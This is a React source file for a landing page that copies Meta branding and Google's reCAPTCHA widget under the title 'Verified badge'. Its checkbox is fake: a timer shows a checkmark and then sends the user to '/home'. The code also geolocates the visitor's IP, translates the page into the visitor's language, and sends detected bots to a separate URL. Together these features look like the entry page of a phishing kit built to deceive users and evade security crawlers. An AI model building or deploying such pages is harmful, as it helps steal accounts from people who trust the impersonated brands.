import { useCallback, useEffect, useMemo, useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router';
import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-logo-grey.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import { translateText } from '@/utils/translate';
import config from '@/utils/config';
import detectBot from '@/utils/detect_bot';
import countryToLanguage from '@/utils/country_to_language';

const Index = () => {
    const navigate = useNavigate();
    const defaultTexts = useMemo(
        () => ({
            pageTitle: 'Verified badge',
            notRobot: "I'm not a robot",
            recaptcha: 'reCAPTCHA',
            privacyTerms: 'Privacy - Terms',
            paragraph1:
                'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
            paragraph2:
                "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
            paragraph3:
                'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.'
        }),
        []
    );
    const [texts, setTexts] = useState(defaultTexts);
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setIsShowCheckMark] = useState(false);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTexts(translated);
            } catch (error) {
                console.error('Index translation error:', error);
                setTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializePage = useCallback(async () => {
        let targetLang = 'en';

        try {
            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
            const geoData = response.data || {};
            localStorage.setItem('ipInfo', JSON.stringify(geoData));

            const countryCode = String(geoData.country_code || '').toUpperCase();
            targetLang = countryToLanguage[countryCode] || 'en';
            localStorage.setItem('targetLang', targetLang);
        } catch (error) {
            console.error('Index geo fetch error:', error);
        }

        const botResult = await detectBot();
        if (botResult.isBot) {
            globalThis.location.href = config.bot_redirect_url;
            return;
        }

        if (targetLang !== 'en') {
            await translateAllTexts(targetLang);
            return;
        }

        setTexts(defaultTexts);
    }, [defaultTexts, translateAllTexts]);

    const handleVerify = () => {
        if (isLoading || isShowCheckMark) {
            return;
        }

        setIsLoading(true);
        setTimeout(() => {
            setIsShowCheckMark(true);
            setIsLoading(false);
        }, 2000);
    };

    useEffect(() => {
        initializePage();
    }, [initializePage]);

    useEffect(() => {
        document.title = texts.pageTitle;
    }, [texts.pageTitle]);

    useEffect(() => {
        if (!isShowCheckMark) {
            return undefined;
        }

        const redirectTimeout = setTimeout(() => {
            navigate('/home');
        }, 500);

        return () => {
            clearTimeout(redirectTimeout);
        };
    }, [isShowCheckMark, navigate]);

    return (
        <div className="captcha-page">
            <div className="captcha-page__container">
                <img src={MetaImage} alt="" className="captcha-page__logo" />

                <div className="captcha-page__widget-wrap">
                    <div className="captcha-page__widget">
                        <div className="captcha-page__widget-left">
                            <div className="captcha-page__checkbox-wrap">
                                <button
                                    type="button"
                                    className="captcha-page__checkbox-btn"
                                    onClick={handleVerify}
                                    aria-label={texts.notRobot}
                                >
                                    {isLoading ? (
                                        <div className="captcha-page__spinner" />
                                    ) : (
                                        <div
                                            className={`captcha-page__checkbox ${isShowCheckMark ? 'captcha-page__checkbox--checked' : ''}`}
                                            style={
                                                isShowCheckMark
                                                    ? {
                                                          backgroundImage: `url("${CheckMarkImage}")`,
                                                          backgroundPosition: '-10px -595px'
                                                      }
                                                    : undefined
                                            }
                                        />
                                    )}
                                </button>
                            </div>
                            <div className="captcha-page__label">{texts.notRobot}</div>
                        </div>

                        <div className="captcha-page__brand">
                            <img src={ReCaptchaImage} alt="" className="captcha-page__brand-logo" />
                            <p className="captcha-page__brand-title">{texts.recaptcha}</p>
                            <small className="captcha-page__brand-links">{texts.privacyTerms}</small>
                        </div>
                    </div>
                </div>

                <div className="captcha-page__text">
                    <p>{texts.paragraph1}</p>
                    <p>{texts.paragraph2}</p>
                    <p>{texts.paragraph3}</p>
                </div>
            </div>
        </div>
    );
};

export default Index;
